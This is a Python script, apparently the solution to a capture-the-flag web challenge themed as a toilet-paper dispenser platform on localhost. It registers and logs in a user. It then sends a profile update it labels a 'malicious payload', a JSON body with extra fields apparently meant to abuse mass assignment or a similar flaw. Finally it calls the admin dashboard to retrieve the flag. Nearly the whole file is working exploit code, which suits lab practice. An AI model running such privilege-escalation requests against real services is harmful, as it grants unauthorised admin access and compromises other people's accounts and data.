#!/usr/bin/env python3
"""
A4 Toilet Paper Dispenser Hub - Client Script
Interacts with the premium bathroom management platform
"""

import requests
import json
import uuid
import sys
from datetime import datetime

class ToiletDispenserClient:
    def __init__(self, base_url="http://localhost:33337"):
        self.base_url = base_url
        self.session = requests.Session()
        
    def register_technician(self, username=None, email=None, password=None):
        """Register a new toilet technician"""
        if not username:
            username = f"technician_{str(uuid.uuid4())[:8]}"
        if not email:
            email = f"{username}@toilet.paper"
        if not password:
            password = "flush123"
            
        print(f"🚽 Registering new toilet technician: {username}")
        
        data = {
            "username": username,
            "email": email,
            "password": password
        }
        
        response = self.session.post(f"{self.base_url}/api/register", json=data)
        
        if response.status_code == 200:
            result = response.json()
            if result.get('success'):
                print(f"✅ Registration successful! Welcome, Toilet Technician {username}")
                return True, username, password
            else:
                print(f"❌ Registration failed: {result.get('error', 'Unknown error')}")
                return False, None, None
        else:
            print(f"❌ Registration failed with status {response.status_code}")
            try:
                error = response.json().get('error', 'Unknown error')
                print(f"   Error: {error}")
            except:
                print(f"   Raw response: {response.text}")
            return False, None, None
    
    def login_technician(self, username, password):
        """Login as a toilet technician"""
        print(f"🔑 Logging in as {username}")
        
        data = {
            "username": username,
            "password": password
        }
        
        response = self.session.post(f"{self.base_url}/api/login", json=data)
        
        if response.status_code == 200:
            result = response.json()
            if result.get('success'):
                print(f"✅ Login successful!")
                return True
            else:
                print(f"❌ Login failed: {result.get('error', 'Unknown error')}")
                return False
        else:
            print(f"❌ Login failed with status {response.status_code}")
            return False
    
    def get_user_profile(self):
        """Get current user profile"""
        print("👤 Fetching current user profile...")
        
        response = self.session.get(f"{self.base_url}/api/user")
        
        if response.status_code == 200:
            user = response.json()
            print(f"✅ Current user: {user.get('username', 'Unknown')}")
            print(f"   Email: {user.get('email', 'Unknown')}")
            print(f"   Permissions: {user.get('userPermissions', {})}")
            return True, user
        else:
            print(f"❌ Failed to get user profile: {response.status_code}")
            return False, None
    
    def update_profile(self, profile_data):
        """Update technician profile with custom data"""
        print("🔧 Updating toilet dispenser configuration...")
        print(f"   Sending payload: {json.dumps(profile_data, indent=2)}")
        
        response = self.session.post(f"{self.base_url}/api/update-profile", json=profile_data)
        
        print(f"📡 Response status: {response.status_code}")
        
        if response.status_code == 200:
            result = response.json()
            if result.get('success'):
                print("✅ Dispenser configuration updated successfully! 🧻✨")
                return True
            else:
                print(f"❌ Update failed: {result.get('error', 'Unknown error')}")
                return False
        else:
            try:
                error_response = response.json()
                print(f"❌ Update failed: {error_response.get('error', 'Unknown error')}")
            except:
                print(f"❌ Update failed with raw response: {response.text}")
            return False
    
    def check_admin_access(self):
        """Attempt to access the master toilet technician dashboard"""
        print("👑 Attempting to access Supreme Toilet Dashboard...")
        
        response = self.session.get(f"{self.base_url}/admin/dashboard")
        
        if response.status_code == 200:
            result = response.json()
            print("🎉 SUCCESS! Master toilet technician access granted!")
            print(f"🏁 FLAG: {result.get('flag', 'No flag found')}")
            print(f"📝 Message: {result.get('message', 'No message')}")
            return True, result.get('flag')
        elif response.status_code == 403:
            try:
                error = response.json().get('error', 'Access denied')
                print(f"🚫 Access denied: {error}")
            except:
                print(f"🚫 Access denied (403)")
            return False, None
        elif response.status_code == 401:
            try:
                error = response.json().get('error', 'Not authenticated')
                print(f"🔒 Not authenticated: {error}")
            except:
                print(f"🔒 Not authenticated (401)")
            return False, None
        else:
            print(f"❌ Unexpected response: {response.status_code}")
            try:
                print(f"   Error: {response.json()}")
            except:
                print(f"   Raw response: {response.text}")
            return False, None

def main():
    print("🧻 A4 Toilet Paper Dispenser Hub - Exploitation Client")
    print("=" * 60)
    
    client = ToiletDispenserClient()
    
    # Step 1: Register a new technician
    success, username, password = client.register_technician()
    if not success:
        print("💥 Failed to register technician. Exiting.")
        sys.exit(1)
    
    # Step 2: Login
    if not client.login_technician(username, password):
        print("💥 Failed to login. Exiting.")
        sys.exit(1)
    
    # Step 3: Get initial profile
    success, initial_profile = client.get_user_profile()
    if success:
        print(f"📋 Initial profile: {json.dumps(initial_profile, indent=2, default=str)}")
    
    # Step 4: Update profile with the specified malicious payload
    print("\n" + "=" * 60)
    print("🎯 PHASE 2: Updating with malicious payload...")
    
    malicious_payload = {
        "username": "asd",
        "email": "asd@asd.asd",
        "toiletExperience": "",
        "a": [],
        "b": [],
        "c": [],
        "dateUpdated": "2025-06-27T17:29:16.032Z",
        "smell": "123",
        "temperature": "123"
    }
    
    if client.update_profile(malicious_payload):
        print("✅ Profile update completed!")
        
        # Get updated profile
        success, updated_profile = client.get_user_profile()
        if success:
            print(f"📋 Updated profile: {json.dumps(updated_profile, indent=2, default=str)}")
    
    # Step 5: Attempt to get the flag
    print("\n" + "=" * 60)
    print("🏁 PHASE 3: Attempting to capture the flag...")
    
    success, flag = client.check_admin_access()
    
    if success:
        print(f"\n🎉 MISSION ACCOMPLISHED! FLAG CAPTURED: {flag}")
    else:
        print("\n💔 Mission failed. No flag captured.")
        print("🔍 Let's check our current permissions...")
        client.get_user_profile()

if __name__ == "__main__":
    main()
